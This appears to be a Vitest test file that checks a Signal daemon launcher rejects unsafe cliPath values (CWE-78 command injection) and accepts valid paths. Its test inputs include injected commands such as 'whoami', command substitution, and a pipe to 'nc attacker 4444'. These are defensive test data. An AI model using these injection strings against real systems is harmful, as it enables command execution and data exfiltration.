import { describe, expect, it, vi } from "vitest";
import { spawnSignalDaemon } from "./daemon.js";

vi.mock("node:child_process", () => ({
  spawn: vi.fn(() => {
    const noop = { on: vi.fn(), once: vi.fn() };
    return {
      pid: 1234,
      stdout: noop,
      stderr: noop,
      on: vi.fn(),
      once: vi.fn(),
      killed: false,
      kill: vi.fn(),
    };
  }),
}));

const baseOpts = {
  httpHost: "127.0.0.1",
  httpPort: 8080,
};

describe("CWE-78: OS command injection via signal cliPath", () => {
  it("should reject cliPath with shell metacharacters ;", () => {
    expect(() => spawnSignalDaemon({ ...baseOpts, cliPath: "signal-cli; whoami" })).toThrow(
      /not a safe executable value/,
    );
  });

  it("should reject cliPath with command substitution $()", () => {
    expect(() => spawnSignalDaemon({ ...baseOpts, cliPath: "$(malicious)" })).toThrow(
      /not a safe executable value/,
    );
  });

  it("should reject cliPath with backtick substitution", () => {
    expect(() => spawnSignalDaemon({ ...baseOpts, cliPath: "`id`" })).toThrow(
      /not a safe executable value/,
    );
  });

  it("should reject cliPath with pipe operator", () => {
    expect(() =>
      spawnSignalDaemon({ ...baseOpts, cliPath: "signal-cli | nc attacker 4444" }),
    ).toThrow(/not a safe executable value/);
  });

  it("should reject cliPath starting with -", () => {
    expect(() => spawnSignalDaemon({ ...baseOpts, cliPath: "--malicious-flag" })).toThrow(
      /not a safe executable value/,
    );
  });

  it("should accept valid bare command name", () => {
    expect(() => spawnSignalDaemon({ ...baseOpts, cliPath: "signal-cli" })).not.toThrow();
  });

  it("should accept valid absolute path", () => {
    expect(() =>
      spawnSignalDaemon({ ...baseOpts, cliPath: "/usr/local/bin/signal-cli" }),
    ).not.toThrow();
  });

  it("should accept valid Windows path", () => {
    expect(() =>
      spawnSignalDaemon({ ...baseOpts, cliPath: "C:\\Program Files\\signal-cli\\signal-cli.exe" }),
    ).not.toThrow();
  });
});
